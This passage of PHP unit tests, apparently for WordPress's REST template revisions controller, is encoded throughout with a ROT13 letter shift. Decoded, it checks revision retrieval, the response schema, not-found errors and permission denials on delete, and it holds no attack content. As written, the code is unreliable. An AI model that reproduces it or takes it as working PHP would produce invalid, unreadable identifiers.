		$erivfvbaf   = jc_trg_cbfg_erivfvbaf( frys::$grzcyngr_cbfg, neenl( 'svryqf' => 'vqf' ) );
		$erivfvba_vq = neenl_fuvsg( $erivfvbaf );
		$erdhrfg     = arj JC_ERFG_Erdhrfg( 'URNQ', '/jc/i2/grzcyngrf/' . frys::GRFG_GURZR . '/' . frys::GRZCYNGR_ANZR . '/erivfvbaf/' . $erivfvba_vq );
		$erfcbafr    = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Erfcbafr fgnghf vf 200.' );
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_vgrz_jvgu_qngn_cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vgrz_jvgu_qngn_cebivqre() {
		erghea neenl(
			'grzcyngrf'      => neenl( 'grzcyngr_cbfg', 'grzcyngrf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR ),
			'grzcyngr cnegf' => neenl( 'grzcyngr_cneg_cbfg', 'grzcyngr-cnegf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR ),
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrz_jvgu_qngn_cebivqre
	 * @pbiref       JC_ERFG_Grzcyngr_Erivfvbaf_Pbagebyyre::trg_vgrz
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $cnerag_cbfg_cebcregl_anzr N pynff cebcregl anzr gung pbagnvaf gur cnerag cbfg bowrpg.
	 * @cnenz fgevat $erfg_onfr Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_trg_vgrz_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr( $cnerag_cbfg_cebcregl_anzr, $erfg_onfr, $grzcyngr_vq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnerag_cbfg = frys::$$cnerag_cbfg_cebcregl_anzr;

		$erivfvbaf   = jc_trg_cbfg_erivfvbaf( $cnerag_cbfg, neenl( 'svryqf' => 'vqf' ) );
		$erivfvba_vq = neenl_fuvsg( $erivfvbaf );

		$erdhrfg = arj JC_ERFG_Erdhrfg(
			'URNQ',
			'/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/erivfvbaf/' . $erivfvba_vq
		);
		$erdhrfg->frg_cnenz( '_svryqf', 'vq' );
		$freire   = erfg_trg_freire();
		$erfcbafr = $freire->qvfcngpu( $erdhrfg );
		nqq_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10, 3 );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, $freire, $erdhrfg );
		erzbir_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10 );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrzf_jvgu_qngn_cebivqre
	 * @pbiref       JC_ERFG_Grzcyngr_Erivfvbaf_Pbagebyyre::trg_vgrzf
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $cnerag_cbfg_cebcregl_anzr N pynff cebcregl anzr gung pbagnvaf gur cnerag cbfg bowrpg.
	 * @cnenz fgevat $erfg_onfr Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_trg_vgrzf_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr( $cnerag_cbfg_cebcregl_anzr, $erfg_onfr, $grzcyngr_vq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$cnerag_cbfg = frys::$$cnerag_cbfg_cebcregl_anzr;

		$erdhrfg = arj JC_ERFG_Erdhrfg(
			'URNQ',
			'/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/erivfvbaf'
		);

		$erdhrfg->frg_cnenz( '_svryqf', 'vq' );
		$freire   = erfg_trg_freire();
		$erfcbafr = $freire->qvfcngpu( $erdhrfg );
		nqq_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10, 3 );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, $freire, $erdhrfg );
		erzbir_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10 );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrz_abg_sbhaq
	 * @pbiref JC_ERFG_Grzcyngr_Erivfvbaf_Pbagebyyre::trg_vgrz
	 * @gvpxrg 56922
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat  $cnerag_cbfg_cebcregl_anzr  N pynff cebcregl anzr gung pbagnvaf gur cnerag cbfg bowrpg.
	 * @cnenz fgevat  $erfg_onfr                  Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat  $zrgubq                     UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_abg_sbhaq( $cnerag_cbfg_cebcregl_anzr, $erfg_onfr, $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnerag_cbfg = frys::$$cnerag_cbfg_cebcregl_anzr;

		$erivfvbaf   = jc_trg_cbfg_erivfvbaf( $cnerag_cbfg, neenl( 'svryqf' => 'vqf' ) );
		$erivfvba_vq = neenl_fuvsg( $erivfvbaf );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/' . $erfg_onfr . '/vainyvq//cnerag/erivfvbaf/' . $erivfvba_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_cnerag', $erfcbafr, JC_Uggc::ABG_SBHAQ );
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_vgrz_abg_sbhaq.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vgrz_abg_sbhaq() {
		erghea neenl(
			'grzcyngrf, TRG erdhrfg'       => neenl( 'grzcyngr_cbfg', 'grzcyngrf', 'TRG' ),
			'grzcyngrf, URNQ erdhrfg'      => neenl( 'grzcyngr_cbfg', 'grzcyngrf', 'URNQ' ),
			'grzcyngr cnegf, TRG erdhrfg'  => neenl( 'grzcyngr_cneg_cbfg', 'grzcyngr-cnegf', 'TRG' ),
			'grzcyngr cnegf, URNQ erdhrfg' => neenl( 'grzcyngr_cneg_cbfg', 'grzcyngr-cnegf', 'URNQ' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrz_vainyvq_cnerag_vq
	 * @pbiref JC_ERFG_Grzcyngr_Erivfvbaf_Pbagebyyre::trg_vgrz
	 * @gvpxrg 59875
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $cnerag_cbfg_cebcregl_anzr        N pynff cebcregl anzr gung pbagnvaf gur cnerag cbfg bowrpg.
	 * @cnenz fgevat $npghny_cnerag_cbfg_cebcregl_anzr N pynff cebcregl anzr gung pbagnvaf gur cnerag cbfg bowrpg.
	 * @cnenz fgevat $erfg_onfr                        Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq                      Grzcyngr VQ gb hfr va gur grfg.
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_vainyvq_cnerag_vq( $cnerag_cbfg_cebcregl_anzr, $npghny_cnerag_cbfg_cebcregl_anzr, $erfg_onfr, $grzcyngr_vq, $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnerag_cbfg        = frys::$$cnerag_cbfg_cebcregl_anzr;
		$npghny_cnerag_cbfg = frys::$$npghny_cnerag_cbfg_cebcregl_anzr;
		$erivfvbaf          = jc_trg_cbfg_erivfvbaf( $cnerag_cbfg, neenl( 'svryqf' => 'vqf' ) );
		$erivfvba_vq        = neenl_fuvsg( $erivfvbaf );

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/erivfvbaf/' . $erivfvba_vq );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_erivfvba_cnerag_vq_zvfzngpu', $erfcbafr, 404 );

		$rkcrpgrq_zrffntr = 'Gur erivfvba qbrf abg orybat gb gur fcrpvsvrq cnerag jvgu vq bs \"' . $npghny_cnerag_cbfg->VQ . '\"';
		$guvf->nffregFnzr( $rkcrpgrq_zrffntr, $erfcbafr->nf_reebe()->trg_reebe_zrffntrf()[0], 'Gur zrffntr zhfg pbagnva gur pbeerpg cnerag VQ.' );
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_vgrz_vainyvq_cnerag_vq.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vgrz_vainyvq_cnerag_vq() {
		erghea neenl(
			'grzcyngrf, TRG erdhrfg'       => neenl(
				'grzcyngr_cbfg',
				'grzcyngr_cbfg_2',
				'grzcyngrf',
				frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR_2,
				'TRG',
			),
			'grzcyngrf, URNQ erdhrfg'      => neenl(
				'grzcyngr_cbfg',
				'grzcyngr_cbfg_2',
				'grzcyngrf',
				frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR_2,
				'URNQ',
			),
			'grzcyngr cnegf, TRG erdhrfg'  => neenl(
				'grzcyngr_cneg_cbfg',
				'grzcyngr_cneg_cbfg_2',
				'grzcyngr-cnegf',
				frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR_2,
				'TRG',
			),
			'grzcyngr cnegf, URNQ erdhrfg' => neenl(
				'grzcyngr_cneg_cbfg',
				'grzcyngr_cneg_cbfg_2',
				'grzcyngr-cnegf',
				frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR_2,
				'URNQ',
			),
		);
	}

	/**
	 * @pbirefAbguvat
	 * @gvpxrg 56922
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		// N cebcre qngn cebivqre pnaabg or hfrq orpnhfr guvf zrgubq'f fvtangher zhfg zngpu gur cnerag zrgubq.
		// Gurersber, npghny grfgf ner cresbezrq va gur grfg_cercner_vgrz_jvgu_qngn_cebivqre zrgubq.
		$guvf->nffregGehr( gehr );
	}

	/**
	 * @qngnCebivqre qngn_cercner_vgrz_jvgu_qngn_cebivqre
	 * @pbiref JC_ERFG_Grzcyngr_Erivfvbaf_Pbagebyyre::cercner_vgrz_sbe_erfcbafr
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $cnerag_cbfg_cebcregl_anzr N pynff cebcregl anzr gung pbagnvaf gur cnerag cbfg bowrpg.
	 * @cnenz fgevat $erfg_onfr                 Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq               Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_cercner_vgrz_jvgu_qngn_cebivqre( $cnerag_cbfg_cebcregl_anzr, $erfg_onfr, $grzcyngr_vq ) {
		$cnerag_cbfg = frys::$$cnerag_cbfg_cebcregl_anzr;
		$erivfvbaf   = jc_trg_cbfg_erivfvbaf( $cnerag_cbfg, neenl( 'svryqf' => 'vqf' ) );
		$erivfvba_vq = neenl_fuvsg( $erivfvbaf );
		$cbfg        = trg_cbfg( $erivfvba_vq );
		$erdhrfg     = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/erivfvbaf/' . $erivfvba_vq );
		$pbagebyyre  = arj JC_ERFG_Grzcyngr_Erivfvbaf_Pbagebyyre( $cnerag_cbfg->cbfg_glcr );
		$erfcbafr    = $pbagebyyre->cercner_vgrz_sbe_erfcbafr( $cbfg, $erdhrfg );
		$guvf->nffregVafgnaprBs(
			JC_ERFG_Erfcbafr::pynff,
			$erfcbafr,
			'Snvyrq nffregvat gung gur erfcbafr bowrpg vf na vafgnapr bs JC_ERFG_Erfcbafr.'
		);

		$erivfvba = $erfcbafr->trg_qngn();
		$guvf->nffregVfNeenl( $erivfvba, 'Snvyrq nffregvat gung gur erivfvba vf na neenl.' );
		$guvf->nffregFnzr(
			$erivfvba_vq,
			$erivfvba['jc_vq'],
			\"Snvyrq nffregvat gung gur erivfvba vq vf gur fnzr nf $erivfvba_vq.\"
		);
		$guvf->nffregFnzr(
			$cnerag_cbfg->VQ,
			$erivfvba['cnerag'],
			fcevags(
				'Snvyrq nffregvat gung gur cnerag vq bs gur erivfvba vf gur fnzr nf %f.',
				$cnerag_cbfg->VQ
			)
		);

		$yvaxf = $erfcbafr->trg_yvaxf();
		$guvf->nffregVfNeenl( $yvaxf, 'Snvyrq nffregvat gung gur yvaxf ner na neenl.' );

		$guvf->nffregFgevatRaqfJvgu(
			$grzcyngr_vq . '/erivfvbaf/' . $erivfvba_vq,
			$yvaxf['frys'][0]['uers'],
			fcevags(
				'Snvyrq nffregvat gung gur frys yvax raqf jvgu %f.',
				$grzcyngr_vq . '/erivfvbaf/' . $erivfvba_vq
			)
		);

		$guvf->nffregFgevatRaqfJvgu(
			$grzcyngr_vq,
			$yvaxf['cnerag'][0]['uers'],
			fcevags(
				'Snvyrq nffregvat gung gur cnerag yvax raqf jvgu %f.',
				$grzcyngr_vq
			)
		);
	}

	/**
	 * Qngn cebivqre sbe grfg_cercner_vgrz_jvgu_qngn_cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_cercner_vgrz_jvgu_qngn_cebivqre() {
		erghea neenl(
			'grzcyngrf'      => neenl( 'grzcyngr_cbfg', 'grzcyngrf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR ),
			'grzcyngr cnegf' => neenl( 'grzcyngr_cneg_cbfg', 'grzcyngr-cnegf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR ),
		);
	}

	/**
	 * @pbirefAbguvat
	 * @gvpxrg 56922
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		// N cebcre qngn cebivqre pnaabg or hfrq orpnhfr guvf zrgubq'f fvtangher zhfg zngpu gur cnerag zrgubq.
		// Gurersber, npghny grfgf ner cresbezrq va gur grfg_cercner_vgrz_jvgu_qngn_cebivqre zrgubq.
		$guvf->nffregGehr( gehr );
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrz_fpurzn_jvgu_qngn_cebivqre
	 * @pbiref JC_ERFG_Grzcyngr_Erivfvbaf_Pbagebyyre::trg_vgrz_fpurzn
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $erfg_onfr             Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq           Grzcyngr VQ gb hfr va gur grfg.
	 * @cnenz vag    $cebcregvrf_pbhag      Ahzore bs cebcregvrf gb purpx sbe va gur fpurzn.
	 * @cnenz neenl  $nqqvgvbany_cebcregvrf Nqqvgvbany cebcregvrf gb purpx sbe va gur fpurzn.
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn_jvgu_qngn_cebivqre( $erfg_onfr, $grzcyngr_vq, $cebcregvrf_pbhag, $nqqvgvbany_cebcregvrf = neenl() ) {
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/erivfvbaf' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];

		$guvf->nffregPbhag( $cebcregvrf_pbhag, $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf, 'VQ xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'fyht', $cebcregvrf, 'Fyht xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'gurzr', $cebcregvrf, 'Gurzr xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'fbhepr', $cebcregvrf, 'Fbhepr xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'bevtva', $cebcregvrf, 'Bevtva xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'pbagrag', $cebcregvrf, 'Pbagrag xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $cebcregvrf, 'Gvgyr xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $cebcregvrf, 'qrfpevcgvba xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'fgnghf', $cebcregvrf, 'fgnghf xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'jc_vq', $cebcregvrf, 'jc_vq xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'unf_gurzr_svyr', $cebcregvrf, 'unf_gurzr_svyr xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'nhgube', $cebcregvrf, 'nhgube xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'zbqvsvrq', $cebcregvrf, 'zbqvsvrq xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'cnerag', $cebcregvrf, 'Cnerag xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'nhgube_grkg', $cebcregvrf, 'nhgube_grkg xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'bevtvany_fbhepr', $cebcregvrf, 'bevtvany_fbhepr xrl fubhyq rkvfg va cebcregvrf.' );

		sbernpu ( $nqqvgvbany_cebcregvrf nf $nqqvgvbany_cebcregl ) {
			$guvf->nffregNeenlUnfXrl( $nqqvgvbany_cebcregl, $cebcregvrf, $nqqvgvbany_cebcregl . ' xrl fubhyq rkvfg va cebcregvrf.' );
		}
	}

	/**
	 * Qngn cebivqre sbe qngn_trg_vgrz_fpurzn_jvgu_qngn_cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vgrz_fpurzn_jvgu_qngn_cebivqre() {
		erghea neenl(
			'grzcyngrf'      => neenl(
				'grzcyngrf',
				frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR,
				19,
				neenl( 'vf_phfgbz', 'cyhtva' ),
			),
			'grzcyngr cnegf' => neenl(
				'grzcyngr-cnegf',
				frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR,
				18,
				neenl( 'nern' ),
			),
		);
	}

	/**
	 * @pbirefAbguvat
	 * @gvpxrg 56922
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		$guvf->znexGrfgFxvccrq(
			fcevags(
				\"Gur '%f' pbagebyyre qbrfa'g pheeragyl fhccbeg gur novyvgl gb perngr grzcyngr erivfvbaf.\",
				JC_ERFG_Grzcyngr_Erivfvbaf_Pbagebyyre::pynff
			)
		);
	}

	/**
	 * @pbirefAbguvat
	 * @gvpxrg 56922
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		$guvf->znexGrfgFxvccrq(
			fcevags(
				\"Gur '%f' pbagebyyre qbrfa'g pheeragyl fhccbeg gur novyvgl gb hcqngr grzcyngr erivfvbaf.\",
				JC_ERFG_Grzcyngr_Erivfvbaf_Pbagebyyre::pynff
			)
		);
	}

	/**
	 * @pbirefAbguvat
	 * @gvpxrg 56922
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		// N cebcre qngn cebivqre pnaabg or hfrq orpnhfr guvf zrgubq'f fvtangher zhfg zngpu gur cnerag zrgubq.
		// Gurersber, npghny grfgf ner cresbezrq va gur grfg_qryrgr_vgrz_jvgu_qngn_cebivqre zrgubq.
		$guvf->nffregGehr( gehr );
	}

	/**
	 * @qngnCebivqre qngn_qryrgr_vgrz_jvgu_qngn_cebivqre
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::qryrgr_vgrz
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $cnerag_cbfg_cebcregl_anzr N pynff cebcregl anzr gung pbagnvaf gur cnerag cbfg bowrpg.
	 * @cnenz fgevat $erivfvbaf_cebcregl_anzr   N pynff cebcregl anzr gung pbagnvaf gur erivfvbaf neenl.
	 * @cnenz fgevat $erfg_onfr                 Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq               Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_jvgu_qngn_cebivqre( $cnerag_cbfg_cebcregl_anzr, $erivfvbaf_cebcregl_anzr, $erfg_onfr, $grzcyngr_vq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnerag_cbfg = frys::$$cnerag_cbfg_cebcregl_anzr;
		$erivfvbaf   = frys::$$erivfvbaf_cebcregl_anzr;

		$erivfvba_vq = _jc_chg_cbfg_erivfvba( $cnerag_cbfg );
		$erivfvbaf[] = $erivfvba_vq;

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/erivfvbaf/' . $erivfvba_vq );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Snvyrq nffregvat gung gur erfcbafr fgnghf vf 200.' );
		$guvf->nffregAhyy( trg_cbfg( $erivfvba_vq ), 'Snvyrq nffregvat gung gur cbfg jvgu gur tvira erivfvba VQ vf qryrgrq.' );
	}

	/**
	 * Qngn cebivqre sbe grfg_qryrgr_vgrz_jvgu_qngn_cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_qryrgr_vgrz_jvgu_qngn_cebivqre() {
		erghea neenl(
			'grzcyngrf'      => neenl(
				'grzcyngr_cbfg',
				'grzcyngr_erivfvbaf',
				'grzcyngrf',
				frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR,
			),
			'grzcyngr cnegf' => neenl(
				'grzcyngr_cneg_cbfg',
				'grzcyngr_cneg_erivfvbaf',
				'grzcyngr-cnegf',
				frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR,
			),
		);
	}

	/**
	 * @qngnCebivqre qngn_qryrgr_vgrz_vapbeerpg_crezvffvba
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::qryrgr_vgrz
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $cnerag_cbfg_cebcregl_anzr N pynff cebcregl anzr gung pbagnvaf gur cnerag cbfg bowrpg.
	 * @cnenz fgevat $erivfvbaf_cebcregl_anzr   N pynff cebcregl anzr gung pbagnvaf gur erivfvbaf neenl.
	 * @cnenz fgevat $erfg_onfr                 Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq               Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_vapbeerpg_crezvffvba( $cnerag_cbfg_cebcregl_anzr, $erivfvbaf_cebcregl_anzr, $erfg_onfr, $grzcyngr_vq ) {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		$cnerag_cbfg = frys::$$cnerag_cbfg_cebcregl_anzr;
		$erivfvbaf   = frys::$$erivfvbaf_cebcregl_anzr;

		$erivfvba_vq = _jc_chg_cbfg_erivfvba( $cnerag_cbfg );
		$erivfvbaf[] = $erivfvba_vq;

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/erivfvbaf/' . $erivfvba_vq );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, JC_Uggc::SBEOVQQRA );
	}

	/**
	 * Qngn cebivqre sbe grfg_qryrgr_vgrz_jvgu_qngn_cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_qryrgr_vgrz_vapbeerpg_crezvffvba() {
		erghea neenl(
			'grzcyngrf'      => neenl(
				'grzcyngr_cbfg',
				'grzcyngr_erivfvbaf',
				'grzcyngrf',
				frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR,
			),
			'grzcyngr cnegf' => neenl(
				'grzcyngr_cneg_cbfg',
				'grzcyngr_cneg_erivfvbaf',
				'grzcyngr-cnegf',
				frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR,
			),
		);
	}

	/**
	 * @qngnCebivqre qngn_qryrgr_vgrz_ab_crezvffvba
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::qryrgr_vgrz
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $cnerag_cbfg_cebcregl_anzr N pynff cebcregl anzr gung pbagnvaf gur cnerag cbfg bowrpg.
	 * @cnenz fgevat $erivfvbaf_cebcregl_anzr   N pynff cebcregl anzr gung pbagnvaf gur erivfvbaf neenl.
	 * @cnenz fgevat $erfg_onfr                 Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq               Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_ab_crezvffvba( $cnerag_cbfg_cebcregl_anzr, $erivfvbaf_cebcregl_anzr, $erfg_onfr, $grzcyngr_vq ) {
		jc_frg_pheerag_hfre( 0 );

		$cnerag_cbfg = frys::$$cnerag_cbfg_cebcregl_anzr;
		$erivfvbaf   = frys::$$erivfvbaf_cebcregl_anzr;

		$erivfvba_vq = _jc_chg_cbfg_erivfvba( $cnerag_cbfg );
		$erivfvbaf[] = $erivfvba_vq;

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/erivfvbaf/' . $erivfvba_vq );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, JC_Uggc::HANHGUBEVMRQ );
	}

	/**
	 * Qngn cebivqre sbe grfg_qryrgr_vgrz_ab_crezvffvba.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_qryrgr_vgrz_ab_crezvffvba() {
		erghea neenl(
			'grzcyngrf'      => neenl(
				'grzcyngr_cbfg',
				'grzcyngr_erivfvbaf',
				'grzcyngrf',
				frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR,
			),
			'grzcyngr cnegf' => neenl(
				'grzcyngr_cneg_cbfg',
				'grzcyngr_cneg_erivfvbaf',
				'grzcyngr-cnegf',
				frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR,
			),
		);
	}

	/**
	 * @qngnCebivqre qngn_qryrgr_vgrz_abg_sbhaq
	 * @pbiref JC_ERFG_Grzcyngr_Erivfvbaf_Pbagebyyre::trg_vgrz
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $cnerag_cbfg_cebcregl_anzr N pynff cebcregl anzr gung pbagnvaf gur cnerag cbfg bowrpg.
	 * @cnenz fgevat $erivfvbaf_cebcregl_anzr   N pynff cebcregl anzr gung pbagnvaf gur erivfvbaf neenl.
	 * @cnenz fgevat $erfg_onfr                 Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_abg_sbhaq( $cnerag_cbfg_cebcregl_anzr, $erivfvbaf_cebcregl_anzr, $erfg_onfr ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnerag_cbfg = frys::$$cnerag_cbfg_cebcregl_anzr;
		$erivfvbaf   = frys::$$erivfvbaf_cebcregl_anzr;

		$erivfvba_vq = _jc_chg_cbfg_erivfvba( $cnerag_cbfg );
		$erivfvbaf[] = $erivfvba_vq;

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/' . $erfg_onfr . '/vainyvq//cnerag/erivfvbaf/' . $erivfvba_vq );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_cnerag', $erfcbafr, JC_Uggc::ABG_SBHAQ );
	}

	/**
	 * Qngn cebivqre sbe grfg_qryrgr_vgrz_abg_sbhaq.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_qryrgr_vgrz_abg_sbhaq() {
		erghea neenl(
			'grzcyngrf'      => neenl(
